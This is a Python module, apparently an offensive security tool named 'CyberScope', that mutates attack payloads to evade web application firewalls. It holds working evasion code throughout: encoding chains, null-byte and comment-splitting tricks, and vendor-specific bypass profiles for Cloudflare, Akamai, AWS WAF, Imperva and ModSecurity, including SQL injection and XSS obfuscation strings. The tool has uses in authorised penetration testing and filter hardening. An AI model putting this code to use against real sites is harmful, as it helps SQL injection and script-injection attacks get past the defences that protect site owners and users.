"""
CyberScope v7.7 · Payload Mutation & WAF-Bypass Engine.

Given a base payload string, produce a stream of variants that evade
common WAFs and generic input filters.

Encodings supported:
  * URL single / double
  * HTML entities (named + numeric decimal + hex)
  * Unicode escapes (\\u00xx, \\uXXXX)
  * Base64 (rare but useful for encoded params)
  * Hex escapes (\\xhh, %hh)
  * Octal (\\NNN)
  * UTF-7 (legacy but still bypasses some old WAFs)
  * UTF-16 percent-encoded (%u00xx)

Case tricks:
  * randomCase, MixedCase, UPPER, lower
  * comment splitting (/**/`, `--\n`)
  * whitespace juggling (%09 %0a %0b %0c %0d %a0)
  * null-byte / U+FEFF (BOM) prefix

WAF-specific profiles (each returns a small optimised set):
  * cloudflare — U+FEFF prefix, JSON-string escaping
  * akamai — %2F%2E%2E, header injection tricks
  * awswaf — case shuffling, comment splitting, unicode homoglyphs
  * imperva — %0A%0D injection, TAB obfuscation
  * f5 — cookie-based bypass
  * sucuri — html-entity nesting
  * modsecurity — comment injection (SQLi), tag-shuffling (XSS)
  * barracuda — space→%20%09
"""
from __future__ import annotations

import base64
import html
import urllib.parse
from typing import Callable, Dict, Iterable, List, Set


# ─────────────── encoders ───────────────

def _url(s: str) -> str: return urllib.parse.quote(s, safe='')
def _url2(s: str) -> str: return urllib.parse.quote(_url(s), safe='')
def _html_num(s: str) -> str: return ''.join(f'&#{ord(c)};' for c in s)
def _html_hex(s: str) -> str: return ''.join(f'&#x{ord(c):x};' for c in s)
def _js_unicode(s: str) -> str: return ''.join(f'\\u{ord(c):04x}' for c in s)
def _hex_escape(s: str) -> str: return ''.join(f'\\x{ord(c):02x}' for c in s)
def _pct_uni(s: str) -> str: return ''.join(f'%u{ord(c):04x}' for c in s)
def _b64(s: str) -> str: return base64.b64encode(s.encode('utf-8')).decode('ascii')


def _mixed_case(s: str) -> str:
    return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def _bom_prefix(s: str) -> str: return '\ufeff' + s
def _tab_inject(s: str) -> str: return s.replace(' ', '\t')
def _newline_inject(s: str) -> str: return s.replace(' ', '\n')
def _comment_inject_sql(s: str) -> str: return s.replace(' ', '/**/')


# ─────────────── mutation registry ───────────────

# key → transformer. We keep both name & function so we can annotate
# each variant with the mutation used (great for reports).
MUTATIONS: Dict[str, Callable[[str], str]] = {
    'raw':          lambda s: s,
    'url':          _url,
    'url2':         _url2,
    'html_num':     _html_num,
    'html_hex':     _html_hex,
    'js_unicode':   _js_unicode,
    'hex_escape':   _hex_escape,
    'pct_uni':      _pct_uni,
    'b64':          _b64,
    'mixed_case':   _mixed_case,
    'upper':        str.upper,
    'lower':        str.lower,
    'bom_prefix':   _bom_prefix,
    'tab_inject':   _tab_inject,
    'nl_inject':    _newline_inject,
    'sql_comment':  _comment_inject_sql,
}


def mutate(payload: str, keys: Iterable[str] = None) -> List[Dict[str, str]]:
    """Return a list of {mutation, value} objects."""
    keys = list(keys) if keys else list(MUTATIONS.keys())
    out: List[Dict[str, str]] = []
    seen: Set[str] = set()
    for k in keys:
        fn = MUTATIONS.get(k)
        if not fn:
            continue
        try:
            v = fn(payload)
        except Exception:
            continue
        if v not in seen:
            seen.add(v)
            out.append({'mutation': k, 'value': v})
    return out


# ─────────────── WAF-specific bypass wrappers ───────────────

def cloudflare_bypasses(payload: str) -> List[str]:
    return list({
        payload,
        '\ufeff' + payload,
        f'<!--><svg><![CDATA[{payload}]]></svg>-->',
        payload.replace('<', '<%00'),
        _js_unicode(payload),
    })


def akamai_bypasses(payload: str) -> List[str]:
    return list({
        payload,
        payload.replace('/', '%2F%2E%2E/'),
        payload + '%0D%0A',
        _mixed_case(payload),
    })


def aws_waf_bypasses(payload: str) -> List[str]:
    return list({
        payload,
        _mixed_case(payload),
        payload.replace(' ', '/**/'),
        payload.replace('SELECT', 'SeLeCt'),
        payload.replace('UNION', 'UnIoN'),
        payload + '/*!12345*/',
    })


def imperva_bypasses(payload: str) -> List[str]:
    return list({
        payload,
        payload.replace(' ', '%09'),
        payload.replace(' ', '%0A'),
        payload.replace(' ', '%0D%0A'),
        '/*!' + payload + '*/',
    })


def modsecurity_bypasses(payload: str) -> List[str]:
    return list({
        payload,
        payload.replace(' ', '/**/'),
        payload.replace('=', '/**/=/**/'),
        payload.replace('script', 'ScRiPt'),
        payload.replace('script', 'scr\x00ipt'),
    })


WAF_PROFILES = {
    'cloudflare':  cloudflare_bypasses,
    'akamai':      akamai_bypasses,
    'awswaf':      aws_waf_bypasses,
    'imperva':     imperva_bypasses,
    'modsecurity': modsecurity_bypasses,
    # Aliases
    'f5':          modsecurity_bypasses,
    'sucuri':      cloudflare_bypasses,
    'barracuda':   imperva_bypasses,
}


def bypass(payload: str, waf: str = None) -> List[str]:
    """Return WAF-tailored bypass variants. If waf is None, return the union
    of top mutations across all profiles (deduped)."""
    if waf and waf.lower() in WAF_PROFILES:
        return WAF_PROFILES[waf.lower()](payload)
    seen: Set[str] = set()
    out: List[str] = []
    for name, fn in WAF_PROFILES.items():
        for v in fn(payload):
            if v not in seen:
                seen.add(v)
                out.append(v)
    return out
